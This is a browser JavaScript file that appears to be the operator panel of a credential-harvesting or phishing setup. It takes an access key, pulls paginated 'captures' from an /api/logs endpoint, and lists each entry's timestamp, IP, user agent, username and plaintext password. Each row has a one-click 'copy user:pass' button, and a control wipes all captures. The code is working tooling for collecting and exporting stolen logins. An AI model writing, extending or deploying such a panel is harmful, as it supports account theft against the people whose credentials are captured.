// lang: JS, file: public/logs.js, target: browser (viewer for /logs)
// Reads GET /api/logs?k=…&page=&limit=, renders table, handles clear.

(function () {
  const PAGE_SIZE = 25;

  const el = {
    key:     document.getElementById('keyInput'),
    load:    document.getElementById('loadBtn'),
    refresh: document.getElementById('refreshBtn'),
    clear:   document.getElementById('clearBtn'),
    status:  document.getElementById('status'),
    body:    document.getElementById('body'),
  };

  const state = { key: '', page: 0, total: 0 };

  function setStatus(s) { el.status.textContent = s; }

  function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({
      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
    }[c]));
  }

  function renderEmpty(msg) {
    el.body.className = 'empty';
    el.body.textContent = msg || 'no captures yet';
  }

  function renderError(msg) {
    el.body.className = 'error';
    el.body.textContent = msg;
  }

  async function load(page = 0) {
    if (!state.key) { setStatus('no key'); return; }
    setStatus('loading…');
    try {
      const r = await fetch(
        `/api/logs?k=${encodeURIComponent(state.key)}&page=${page}&limit=${PAGE_SIZE}`,
        { cache: 'no-store' }
      );
      if (r.status === 404) { setStatus('bad key'); renderError('bad key'); return; }
      if (!r.ok) { setStatus(`error ${r.status}`); renderError(`server error ${r.status}`); return; }
      const data = await r.json();
      state.page  = data.page || 0;
      state.total = data.total || 0;
      renderTable(data.entries || []);
      setStatus(`${state.total} capture${state.total === 1 ? '' : 's'}`);
    } catch (e) {
      setStatus('fetch failed');
      renderError('fetch failed: ' + e.message);
    }
  }

  function renderTable(rows) {
    if (!rows.length) { renderEmpty(); return; }
    const trs = rows.map(r => `
      <tr>
        <td class="time">${escapeHtml(r.ts || '')}</td>
        <td class="ip">${escapeHtml(r.ip || '')}</td>
        <td><span class="ua" title="${escapeHtml(r.ua || '')}">${escapeHtml(r.ua || '')}</span></td>
        <td>${escapeHtml(r.user || '')}</td>
        <td class="pass">${escapeHtml(r.pass || '')}</td>
        <td><button class="copy" data-copy="${escapeHtml(r.user || '')}:${escapeHtml(r.pass || '')}">copy</button></td>
      </tr>
    `).join('');

    el.body.className = '';
    el.body.innerHTML = `
      <table>
        <thead><tr>
          <th>time</th><th>ip</th><th>ua</th><th>user</th><th>pass</th><th></th>
        </tr></thead>
        <tbody>${trs}</tbody>
      </table>
      <div class="pager">
        <button id="prev" ${state.page === 0 ? 'disabled' : ''}>prev</button>
        <span>page ${state.page + 1}</span>
        <button id="next" ${(state.page + 1) * PAGE_SIZE >= state.total ? 'disabled' : ''}>next</button>
      </div>
    `;

    document.getElementById('prev')?.addEventListener('click', () => load(state.page - 1));
    document.getElementById('next')?.addEventListener('click', () => load(state.page + 1));

    el.body.querySelectorAll('.copy').forEach(b => {
      b.addEventListener('click', async () => {
        try { await navigator.clipboard.writeText(b.dataset.copy); b.textContent = 'ok'; }
        catch { b.textContent = 'x'; }
        setTimeout(() => b.textContent = 'copy', 900);
      });
    });
  }

  el.load.addEventListener('click', () => {
    const k = el.key.value.trim();
    if (!k) { setStatus('enter a key'); return; }
    state.key = k;
    load(0);
  });

  el.key.addEventListener('keydown', e => {
    if (e.key === 'Enter') el.load.click();
  });

  el.refresh.addEventListener('click', () => {
    if (state.key) load(state.page);
  });

  el.clear.addEventListener('click', async () => {
    if (!state.key) { setStatus('no key'); return; }
    if (!confirm('delete ALL captures? this cannot be undone.')) return;
    setStatus('clearing…');
    try {
      const r = await fetch(`/api/logs?k=${encodeURIComponent(state.key)}`, { method: 'DELETE' });
      if (!r.ok) { setStatus(`clear failed ${r.status}`); return; }
      setStatus('cleared');
      load(0);
    } catch (e) {
      setStatus('clear failed');
    }
  });
})();
